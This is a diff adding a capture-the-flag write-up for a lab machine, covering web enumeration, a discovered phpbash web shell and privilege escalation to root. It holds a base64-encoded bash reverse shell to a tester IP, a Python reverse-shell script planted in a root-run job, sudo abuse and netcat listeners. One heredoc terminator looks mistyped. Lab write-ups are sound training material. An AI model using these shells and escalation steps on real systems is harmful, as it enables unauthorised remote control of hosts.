@@ -35,3 +35,110 @@ PORT   STATE SERVICE REASON         VERSION
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 ```
+
+## WebApp
+
+after connecting to the webapp we found something interesting , they have a backdoor installed to the website
+
+![](Screen/Pasted%20image%2020260501172604.png)
+
+lets run a directory bruteforce to see where the backdoor is installed with gobuster
+
+command
+
+```bash
+gobuster dir -u http://10.129.29.47/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --no-error -x php,html,txt
+```
+
+output
+
+![](Screen/Pasted%20image%2020260501173526.png)
+
+theres an interesting folder called dev and upon entering we found the phpbash backdoor
+
+![](Screen/Pasted%20image%2020260501173613.png)
+
+# Exploit
+## RCE
+
+now we need to upgrade this shell so i started a listener and connected back to my kali machine
+
+listener
+
+```
+rlwrap nc -lvvnp 4444
+```
+
+reverse shell 
+
+```bash
+echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjU0LzQ0NDQgMD4mMQ==|base64 -d|bash
+```
+
+and after sending the command we got a callback
+
+![](Screen/Pasted%20image%2020260501174506.png)
+
+## LPE
+
+checking for privilege we found this
+
+![](Screen/Pasted%20image%2020260501174733.png)
+
+so i just ran a simple sudo command to get into a bash with the user scriptmanager
+
+```bash
+sudo -u scriptmanager /bin/bash
+```
+
+and then i upgraded the session into a TTY 
+
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
+![](Screen/Pasted%20image%2020260501175131.png)
+
+checking the root folder theres a strange folder called scripts that holds 2 test files
+
+![](Screen/Pasted%20image%2020260501181238.png)
+
+checking the owners of the files we can assume that this script is run by root
+
+![](Screen/Pasted%20image%2020260501181341.png)
+
+so if we load a reverse shell in the python script we sould get a root shell
+
+## Exploit crafting
+
+so i run locally a listener on the port 4445
+
+```bash
+rlwrap nc -lvvnp 4445
+```
+
+than on the victim machine i copy paste a simple python reverse shell 
+
+```bash
+cat > test.py << EOF
+import socket, subprocess, os
+import pty
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.15.54", 4445))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+pty.spawn("/bin/bash")
+>> EOF
+```
+
+and after some minutes i got a reverse shell as root
+
+![](Screen/Pasted%20image%2020260501182158.png)
+
+
+
+
+
+
